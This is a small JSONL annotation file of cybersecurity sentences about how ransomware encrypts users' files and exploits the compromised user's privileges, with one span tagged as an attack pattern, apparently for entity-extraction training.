{"id":151,"text":"Once malware is running on the user’s system, it seeks out and encrypts files and folders that hold information critical for the user, such as documents, business applications or even database files.","entities":[],"relations":[],"Comments":[]}
{"id":152,"text":"In some cases, the ransomware is sophisticated enough to target specific application files.","entities":[],"relations":[],"Comments":[]}
{"id":153,"text":"Most importantly, because the ransomware is executing with the compromised user’s privileges, any file the legitimate, now-compromised user has access to, including network shares and backups, is fair game for the ransomware.","entities":[{"id":44607,"label":"attack-pattern","start_offset":63,"end_offset":92}],"relations":[],"Comments":[]}
{"id":154,"text":" It’s this last point that gets to the heart of why ransomware is so potent.","entities":[],"relations":[],"Comments":[]}

{"id":161,"text":" Bringing that lesson to bear here, the only way the operating system could protect against ransomware would be to raise “Are you sure?” dialog boxes on everyday operations against the kinds of files that ransomware targets.","entities":[],"relations":[],"Comments":[]}
